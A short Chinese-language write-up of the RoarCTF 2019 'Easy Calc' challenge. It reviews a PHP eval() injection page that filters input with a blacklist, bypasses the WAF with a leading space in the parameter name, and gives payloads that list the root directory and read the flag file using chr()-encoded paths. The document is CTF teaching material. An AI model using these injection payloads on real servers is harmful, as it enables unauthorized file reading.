# [RoarCTF 2019]Easy Calc 1

- 网页中没有有效信息，查看源码，发现calc.php，同时注意上面的注释 `I've set up WAF to ensure security.`

> <img src="../../IMG2/Screenshot 2024-05-20 214119.png">

- 进入calc.php，开始代码审计

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

- 代码内容是过滤了一些特殊字符，然后传入eval()执行，那么我们可以直接使用一些php函数，使用 `var_dump(scandir())` 输出文件目录，这里注意 `/` 被过滤了，所以需要ascii码使用 `chr()` 来转换。这里还需要注意一点，上文提到过 `I've set up WAF to ensure security.` ，WAF全程Web Application Firewall，也就是网页应用防火墙，可以防止SQL注入，XSS注入和Cookie被更改等，这道题的WAF的主要功能是阻止用户发送GET请求，也就是不能直接在url栏传参，如下

> <img src="../../IMG2/Screenshot 2024-05-21 182827.png">

- 不过绕过也非常简单，只需要在num前加个空格就行了

> <img src="../../IMG2/Screenshot 2024-05-21 182950.png">

- 下面获取根目录

`? num=var_dump(scandir(chr(47)))`

> <img src="../../IMG2/Screenshot 2024-05-21 183138.png">

- 发现 `f1agg` ，构建payload

`? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

- 传参，得到flag

> <img src="../../IMG2/Screenshot 2024-05-21 183605.png">